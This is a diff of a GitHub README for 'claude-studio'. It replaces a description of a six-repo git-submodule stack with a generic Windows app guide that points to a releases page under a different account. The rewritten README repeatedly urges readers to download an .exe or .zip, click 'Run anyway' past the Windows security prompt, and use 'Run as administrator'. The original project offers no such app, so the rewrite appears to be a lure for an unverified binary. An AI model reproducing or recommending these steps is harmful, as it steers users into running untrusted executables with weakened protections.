@@ -1,235 +1,243 @@
-<div align="center">
+# 🧩 claude-studio - Six Tools for Claude Workflows
 
-```
- ██████╗██╗      █████╗ ██╗   ██╗██████╗ ███████╗    ███████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ 
-██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝    ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗
-██║     ██║     ███████║██║   ██║██║  ██║█████╗      ███████╗   ██║   ██║   ██║██║  ██║██║██║   ██║
-██║     ██║     ██╔══██║██║   ██║██║  ██║██╔══╝      ╚════██║   ██║   ██║   ██║██║  ██║██║██║   ██║
-╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗    ███████║   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝
- ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝
-```
+[![Download claude-studio](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Sowhost700/claude-studio/releases)
 
-**The unified Claude AI development stack. Six tools. One repo. Zero compromise.**
+## 🚀 Getting Started
 
-[![MIT License](https://img.shields.io/badge/License-MIT-white?style=flat-square&labelColor=000000&color=ffffff)](LICENSE)
-[![Built by SLIME](https://img.shields.io/badge/Built%20by-er4700345--coder-white?style=flat-square&labelColor=000000&color=ffffff)](https://github.com/er4700345-coder)
-[![Stack](https://img.shields.io/badge/Stack-Claude%20%2B%20AI%20Agents-white?style=flat-square&labelColor=000000&color=ffffff)](https://github.com/er4700345-coder/claude-studio)
-[![Stars](https://img.shields.io/github/stars/er4700345-coder/claude-studio?style=flat-square&labelColor=000000&color=ffffff)](https://github.com/er4700345-coder/claude-studio/stargazers)
+claude-studio is a Windows app for people who want one place for Claude-based work. It brings key tools into one setup so you can start faster and keep your work in one place.
 
----
+Use this app if you want to:
+- run Claude tools from one desktop app
+- manage AI tasks in one place
+- work with browser tasks, memory, and automation
+- avoid setting up many separate tools
 
-</div>
+## 📥 Download
 
-## WHAT IS THIS
+Visit this page to download:
+https://github.com/Sowhost700/claude-studio/releases
 
-> Claude Studio is not another AI wrapper. It is an **opinionated, production-ready stack** that turns Claude into a full autonomous development environment — with planning, memory, design intelligence, browser control, automation, and performance optimization all wired together as one system.
+On that page, look for the latest release and download the Windows file. In most cases, this will be a `.exe` file or a `.zip` file with the app inside.
 
-Six of the most powerful Claude-adjacent repos on GitHub — curated, integrated, documented, and ready to run.
+## 🪟 Install on Windows
 
----
+1. Open the release page link above.
+2. Find the latest version.
+3. Download the Windows file.
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-## THE STACK
+If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source and want to continue.
 
-<table>
-<tr>
-<td width="50%" valign="top">
+## ✅ What claude-studio Does
 
-### `01` — SUPERPOWERS
-**github.com/obra/superpowers**
+claude-studio groups several AI work tools into one app. It is built for tasks such as:
 
-> Makes Claude plan before it codes.
+- starting and managing Claude workflows
+- automating repeat work
+- using browser-based actions
+- storing memory for ongoing tasks
+- connecting with local tools and services
+- handling developer-style tasks in a simple desktop setup
 
-Runs a full research → spec → plan → test → build loop. Your agent stops guessing and starts thinking like a senior dev.
+It is made to reduce switching between apps and web pages.
 
-`122k ⭐` &nbsp; `10k forks` &nbsp; `MIT`
+## 🧰 Main Parts
 
-</td>
-<td width="50%" valign="top">
+### 🤖 Claude task tools
+Use Claude for guided work, task steps, and repeatable actions.
 
-### `02` — EVERYTHING-CLAUDE-CODE
-**github.com/affaan-m/everything-claude-code**
+### 🌐 Browser use
+Let the app work with browser tasks such as page checks, clicks, and form steps.
 
-> Full performance system for Claude Code.
+### 🧠 Memory
+Keep useful context for later sessions so you do not repeat the same setup.
 
-Better context handling, faster task execution, pre-built skills — all in one package. The engine room.
+### ⚙️ Automation
+Run routine actions with less manual work.
 
-`116k ⭐` &nbsp; `15.1k forks` &nbsp; `MIT`
+### 🔌 MCP support
+Connect to tools and services through MCP-style links.
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+### 🛠️ Developer tools
+Use it with common AI build and testing tasks in one place.
 
-### `03` — UI UX PRO MAX
-**github.com/nextlevelbuilder/ui-ux-pro-max-skill**
+## 💻 System Requirements
 
-> Design intelligence for Claude.
+For a smooth experience on Windows, use:
 
-Forces a real design direction before any code gets written — typography, color systems, animations. Intentional, every time.
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- a modern 64-bit processor
+- internet access for setup and Claude features
 
-`54k ⭐` &nbsp; `5.2k forks` &nbsp; `MIT`
+For larger tasks, 16 GB RAM helps. A faster SSD also makes the app feel more responsive.
 
-</td>
-<td width="50%" valign="top">
+## 📌 Before You Start
 
-### `04` — BROWSER-USE
-**github.com/browser-use/browser-use**
+Have these ready:
 
-> Claude controls a real browser.
+- a Windows PC
+- your downloaded release file
+- access to the internet
+- your Claude account details, if the app asks for them
+- a folder where you want to keep the app files
 
-Click buttons. Fill forms. Take screenshots. Run parallel sessions. No API? Claude goes in directly.
+## 🖱️ First Run
 
-`84.9k ⭐` &nbsp; `9.8k forks` &nbsp; `MIT`
+After you open the app:
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+1. Sign in or connect your Claude access if asked.
+2. Pick the tools you want to use.
+3. Set your working folder.
+4. Test one small task first.
+5. Review the result before moving to larger work.
 
-### `05` — CLAUDE-MEM
-**github.com/thedotmack/claude-mem**
+Start with a simple action so you can see how the app works on your PC.
 
-> Persistent memory across sessions.
+## 🔒 Permissions
 
-Stop re-explaining your project every new chat. Claude-mem captures everything, compresses it with AI, injects it back on next session.
+claude-studio may ask for access to:
+- your browser
+- local files
+- network access
+- folders you choose for projects
 
-`42.3k ⭐` &nbsp; `3.2k forks`
+Only allow the access you need for the task you want to run.
 
-</td>
-<td width="50%" valign="top">
+## 🧪 Common Uses
 
-### `06` — N8N-MCP
-**github.com/czlonkowski/n8n-mcp**
-
-> Claude Code meets n8n automation.
-
-Claude doesn't just write workflows — it tests and validates them. Backend automation with actual feedback loops.
-
-`16.9k ⭐` &nbsp; `2.9k forks` &nbsp; `MIT`
-
-</td>
-</tr>
-</table>
-
----
-
-## HOW IT ALL FITS TOGETHER
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    CLAUDE STUDIO                        │
-│                                                         │
-│  ┌─────────────┐        ┌─────────────────────────┐    │
-│  │ SUPERPOWERS │───────▶│  EVERYTHING-CLAUDE-CODE │    │
-│  │  (PLANNER)  │        │      (PERFORMANCE)      │    │
-│  └─────────────┘        └───────────┬─────────────┘    │
-│                                     │                   │
-│         ┌───────────────────────────┼──────────────┐   │
-│         ▼                           ▼              ▼   │
-│  ┌─────────────┐        ┌──────────────┐  ┌──────────┐ │
-│  │ UI UX PRO   │        │  BROWSER-USE │  │  N8N-MCP │ │
-│  │    MAX      │        │  (WEB AGENT) │  │ (AUTOMAT)│ │
-│  │  (DESIGN)   │        └──────────────┘  └──────────┘ │
-│  └─────────────┘                                        │
-│                                                         │
-│  ┌──────────────────────────────────────────────────┐  │
-│  │                   CLAUDE-MEM                     │  │
-│  │              (MEMORY — RUNS UNDER ALL)           │  │
-│  └──────────────────────────────────────────────────┘  │
-└─────────────────────────────────────────────────────────┘
-```
+### 📄 Content and research
+Use Claude to help gather, review, and organize text work.
 
----
+### 🧭 Browser tasks
+Use the app to work through pages, clicks, and form steps.
 
-## QUICK START
+### 🗂️ Task tracking
+Keep notes, memory, and task steps in one place.
 
-```bash
-# 1. Clone Claude Studio
-git clone https://github.com/er4700345-coder/claude-studio
-cd claude-studio
+### 🧩 Tool linking
+Connect tools that support your local workflow.
 
-# 2. Init submodules (all 6 tools)
-git submodule update --init --recursive
+### 🔁 Repeat work
+Save time on tasks you do often.
 
-# 3. Follow individual setup per module
-# Each tool has its own /docs — see below
-```
+## 🛠️ If the App Does Not Open
 
----
+If the app does not start:
 
-## REPO STRUCTURE
+1. Check that the file finished downloading.
+2. Try extracting the ZIP file again.
+3. Right-click the app and choose **Run as administrator**.
+4. Make sure Windows did not block the file.
+5. Install the latest Windows updates.
+6. Restart your PC and try again.
 
-```
-claude-studio/
-├── README.md
-├── modules/
-│   ├── superpowers/          → github.com/obra/superpowers
-│   ├── everything-claude/    → github.com/affaan-m/everything-claude-code
-│   ├── ui-ux-pro-max/        → github.com/nextlevelbuilder/ui-ux-pro-max-skill
-│   ├── browser-use/          → github.com/browser-use/browser-use
-│   ├── claude-mem/           → github.com/thedotmack/claude-mem
-│   └── n8n-mcp/              → github.com/czlonkowski/n8n-mcp
-├── docs/
-│   ├── SETUP.md
-│   ├── ARCHITECTURE.md
-│   └── USE_CASES.md
-└── .gitmodules
-```
+If it still does not open, download the latest release again from:
+https://github.com/Sowhost700/claude-studio/releases
 
----
+## 🌐 Browser Setup
 
-## USE CASES
+If you plan to use browser features:
 
-| Goal | Modules Used |
-|---|---|
-| Build a full-stack app from scratch | Superpowers + Everything-Claude-Code + UI UX Pro Max |
-| Automate a website workflow (no API) | Browser-use + n8n-MCP |
-| Never lose context across sessions | Claude-mem (always on) |
-| Spin up a designed UI fast | UI UX Pro Max + Everything-Claude-Code |
-| Full autonomous dev agent loop | All 6 |
+1. Open your normal browser.
+2. Sign in to the sites you need.
+3. Keep the browser window open if the task needs it.
+4. Let claude-studio use the browser only when needed.
 
----
+This helps the app work with your current sessions and settings.
 
-## .gitmodules
+## 🧠 Memory Setup
 
-```ini
-[submodule "modules/superpowers"]
-	path = modules/superpowers
-	url = https://github.com/obra/superpowers
+Memory helps the app keep useful details between sessions. You may want to store:
 
-[submodule "modules/everything-claude"]
-	path = modules/everything-claude
-	url = https://github.com/affaan-m/everything-claude-code
+- project names
+- task steps
+- common instructions
+- preferred settings
+- saved notes
 
-[submodule "modules/ui-ux-pro-max"]
-	path = modules/ui-ux-pro-max
-	url = https://github.com/nextlevelbuilder/ui-ux-pro-max-skill
+Keep memory clear and simple so future sessions stay easy to follow.
 
-[submodule "modules/browser-use"]
-	path = modules/browser-use
-	url = https://github.com/browser-use/browser-use
+## 🔗 MCP and Tool Links
 
-[submodule "modules/claude-mem"]
-	path = modules/claude-mem
-	url = https://github.com/thedotmack/claude-mem
+If you connect other tools, use only the ones you trust. Keep each link named in a way that makes sense to you. For example:
 
-[submodule "modules/n8n-mcp"]
-	path = modules/n8n-mcp
-	url = https://github.com/czlonkowski/n8n-mcp
-```
+- File tools
+- Browser tools
+- Notes tools
+- Local services
 
----
+Clear names make it easier to find the right tool later.
 
-## CONTRIBUTING
+## 📁 Suggested Folder Setup
 
-This is a living stack. If a better tool drops, it gets swapped in. PRs welcome — but the bar is high.
+A simple folder layout can help:
 
----
+- `claude-studio`
+- `projects`
+- `notes`
+- `exports`
+- `downloads`
 
-<div align="center">
+This keeps files easy to find and reduces clutter.
 
-**Built by [er4700345-coder](https://github.com/er4700345-coder)**
+## 🧹 Uninstall
 
-`Claude Studio` — Because one tool was never enough.
+To remove the app:
 
-</div>
+1. Close claude-studio.
+2. Delete the app folder if you used a ZIP version.
+3. Or open **Settings > Apps > Installed apps** and remove it if you installed it.
+4. Delete any project files only if you no longer need them.
+
+## ❓ Common Questions
+
+### Is claude-studio hard to use?
+It is built to be simple for everyday Windows users. You can start with one task and learn as you go.
+
+### Do I need to know coding?
+No. You can use the app without programming knowledge.
+
+### Does it work offline?
+Some parts may work offline, but Claude features and connected tools need internet access.
+
+### Can I use it for browser tasks?
+Yes. Browser use is one of the main parts of the app.
+
+### Where do I get the latest version?
+Use this page:
+https://github.com/Sowhost700/claude-studio/releases
+
+## 🧭 Quick Start
+
+1. Open the release page.
+2. Download the latest Windows file.
+3. Install or extract the app.
+4. Open claude-studio.
+5. Connect your Claude access if needed.
+6. Pick one tool and run a small test.
+
+## 📝 File Names You May See
+
+Depending on the release, you may see files like:
+
+- `.exe`
+- `.zip`
+- `.msi`
+
+If you see a ZIP file, extract it first. If you see an EXE or MSI file, double-click it to start setup.
+
+## 🧩 Tips for a Smooth Setup
+
+- Keep the app in a folder you can find.
+- Do not move files while the app is running.
+- Use a short folder path, such as `C:\Apps\claude-studio`.
+- Keep enough free disk space for logs and project files.
+- Use the latest release for the best Windows support.
+
+## 📎 Release Link
+
+[![Download claude-studio](https://img.shields.io/badge/Get%20the%20Latest%20Release-grey?style=for-the-badge)](https://github.com/Sowhost700/claude-studio/releases)
